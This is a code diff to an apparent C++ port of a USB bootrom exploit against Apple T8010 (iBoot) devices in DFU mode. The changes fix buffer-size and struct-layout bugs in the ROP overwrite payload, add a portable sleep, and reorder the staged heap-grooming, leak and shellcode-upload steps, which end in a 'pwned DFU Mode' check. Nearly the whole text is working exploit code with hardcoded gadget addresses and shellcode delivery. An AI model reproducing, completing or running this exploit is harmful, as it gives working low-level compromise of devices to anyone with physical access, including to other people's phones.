@@ -8,6 +8,14 @@
 
 #include <unistd.h>
 
+#ifdef WIN32
+#include <windows.h>
+#elif _POSIX_C_SOURCE >= 199309L
+#include <time.h>   // for nanosleep
+#else
+#include <unistd.h> // for usleep
+#endif
+
 using namespace std;
 
 #include "dfu.h"
@@ -245,6 +253,21 @@ typedef struct _Callback {
 
 } Callback;
 
+
+void sleep_ms(int milliseconds) // cross-platform sleep function
+{
+#ifdef WIN32
+    Sleep(milliseconds);
+#elif _POSIX_C_SOURCE >= 199309L
+    struct timespec ts;
+    ts.tv_sec = milliseconds / 1000;
+    ts.tv_nsec = (milliseconds % 1000) * 1000000;
+    nanosleep(&ts, NULL);
+#else
+    usleep(milliseconds * 1000);
+#endif
+}
+
 vector<uint8_t> usb_rop_callbacks(uint64_t address, uint64_t func_gadget,
                                   vector<Callback> callbacks) {
   vector<uint64_t> data;
@@ -280,7 +303,7 @@ vector<uint8_t> usb_rop_callbacks(uint64_t address, uint64_t func_gadget,
   }
 
   vector<uint8_t> dataOut;
-  append<uint8_t>(dataOut, (uint8_t *)data.data(), data.size());
+  append<uint8_t>(dataOut, (uint8_t *)data.data(), data.size() * sizeof(uint64_t));
 
   return dataOut;
 }
@@ -487,23 +510,29 @@ vector<uint8_t> getT8010Shellcode() {
 }
 
 int main(int argc, char *argv[]) {
-  DFU D;
-  if (!D.acquire_device()) {
-    return 1;
-  }
 
+//t8010_overwrite = '\0' * 0x580 + struct.pack('< 32x 2Q 16x 32x 2Q I',    
+// t8010_nop_gadget, 
+// 0x1800B0800, 
+// t8010_nop_gadget, 
+// 0x1800B0800, 
+// 0xbeefbeef)
 #pragma pack(1)
   typedef struct alignas(1) {
-    uint8_t temp0[32] = {0};
-    uint64_t t8010_nop_gadget = 0x10000CC6C;
+    uint8_t temp0[0x580] = {0};
+    uint8_t temp1[32] = {0};
+    uint64_t t8010_nop_gadget0 = 0x10000CC6C;
     uint64_t Offset = 0x1800B0800;
     uint8_t temp[16 + 32] = {0};
+    uint64_t t8010_nop_gadget1 = 0x10000CC6C;
     uint64_t Offset2 = 0x1800B0800;
-    uint64_t End = 0xbeefbeef;
-  } t8010_overwrite;
+    uint32_t End = 0xbeefbeef;
+  } t8010_overwrite __attribute__ ((aligned (1)));;
 
   // Create device config
   t8010_overwrite Overwrite;
+  assert(sizeof(t8010_overwrite) == 1524);
+
   DeviceConfig DC_t8010("iBoot-2696.0.0.1.33", 0x8010, 0, (uint8_t *)&Overwrite,
                         sizeof(Overwrite), 5, 1);
 
@@ -511,9 +540,14 @@ int main(int argc, char *argv[]) {
   auto Shellcode = getT8010Shellcode();
 
   // Run exploit (t8010 specific)
+  DFU D;
   printf("[*] stage 1, heap grooming ...\n");
+  if (!D.acquire_device()) {
+    return 1;
+  }
   D.stall();
   for (int i = 0; i < DC_t8010.hole; i++) {
+    printf("no_leak\n");
     D.no_leak();
   }
   D.usb_req_leak();
@@ -532,7 +566,7 @@ int main(int argc, char *argv[]) {
   D.release_device();
 
   //Sleep(500);
-  sleep(500);
+  sleep_ms(500);
 
   printf("[*] stage 3, exploit\n");
   D.acquire_device();
@@ -551,6 +585,7 @@ int main(int argc, char *argv[]) {
     if ((Size + i) > Shellcode.size()) {
       Size = Shellcode.size() - i;
     }
+    printf("%d\n", Size);
 
     D.libusb1_no_error_ctrl_transfer(0x21, 1, 0, 0, Shellcode.data() + i, Size,
                                      100);
@@ -560,6 +595,11 @@ int main(int argc, char *argv[]) {
 
   D.acquire_device();
   // Check serial number string here!
+  if (D.isExploited()) {
+    printf("[!] Device is now in pwned DFU Mode! :D\n");
+  } else {
+    printf("[!] Explot failed! :(\n");
+  }
   D.release_device();
   return 0;
 }
